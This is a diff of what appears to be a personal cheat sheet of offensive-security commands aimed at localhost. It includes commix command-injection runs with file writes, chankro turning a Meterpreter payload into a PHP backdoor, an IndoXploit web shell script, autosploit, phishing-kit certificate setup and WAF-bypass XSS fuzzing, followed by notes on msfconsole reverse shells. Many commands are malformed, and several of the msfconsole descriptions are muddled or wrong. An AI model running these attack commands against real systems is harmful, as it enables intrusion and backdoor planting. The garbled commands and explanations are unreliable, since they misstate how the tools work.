@@ -80,11 +80,10 @@ bundle install && rake install
 python3 arjun.py -u http://localhost/ajax/
 commix --url="http//localhost/ajax/" -file-write=/root/Pictures/kali.png  --file-dest=uploads/ --data="name=Fawkes&email=fox@gmail.com8submit=submit" -cookie=tvisited=94..23c" --proxy="httpc/127.0.0.1:8080/" 
 ./parameth.py -u http://localhost/act.php
-commix --url="http://localhost/demo.php --data="name=discobisquits&weighr=discobisquits" --web-root=/opt/lampp/
+commix --url="http://localhost/demo.php --data="name=fun&weight=fun" --web-root=/opt/lampp/
 
 pip2 install -r requirements.txt
 docker-compose run -fin autosploit # debt/ops/
-python autosploit.py
 openssl req -newkey rsa:2048 -nodes -keyout gophish.key -x509 -days 365 -out gophish.crt
 pip install beautifulsoup4 requests
 apt-get install libcurl4-openssl-dev
@@ -101,10 +100,14 @@ chankro.py --arch 64 --input METER --output back.php
 bash Remot3d IndoXploit th3_p4ssw0rd_l0ck3
 make && gcc -Wall -Wextra -o drink me.c
 cat hello_world.x86_64 | ./drinkme
-python wafninja.py fuzz -u "http://localhost/action.php?id=FUZZ/" -c "phpsessid=value" -t xss -o output.html
-python3 wafpass.py --url http://localhost/action.phpPname=discobisquits8oweigth=discobisquits
+wafninja.py fuzz -u "http://localhost/action.php?id=FUZZ/" -c "phpsessid=value" -t xss -o output.html
+wafpass.py --url http://localhost/action.phpPname=fun8oweigth=fun
 
-scrapy genspider -t crawl exam coinbase.com && scrapy crawl quotes : -O q.json -a tag=humor scrapy shell 'url' : file.html && text response.css("span.text::text").getall() && quotesbot / scrapy toscrape-css -o q.json && scrapy fetch -nolog --headers url
+scrapy genspider -t crawl exam coinbase.com
+scrapy crawl quotes -O q.json -a tag=humor scrapy shell 'url' file.html \
+text response.css("span.text::text").getall()
+quotesbot|scrapy toscrape-css -o q.json
+scrapy fetch -nolog --headers url
 ```
 msfconsole is a toolkit for embedding payloads to induce reverse shell of binaries. See more in exploit-db.com, searchsploit, msfvenom, setoolkit and u3-pwn. Firewalls are his enemy. Payload: Binary connection in reverse. Exploit: Virus that bring shell if executed. Encoder: Padding zeros in binary tails. Fuzzer: Overflow apps to crash with ICMP packets. LPORT: netcat -l 80 or apache2 start. RPORT: 22 with SSH mitm attack. Commands: use - multi/handler is a listener, show, set, exploit. PostgreSQL inside RDS, msfdb init, db_rebuild_cache. 
 
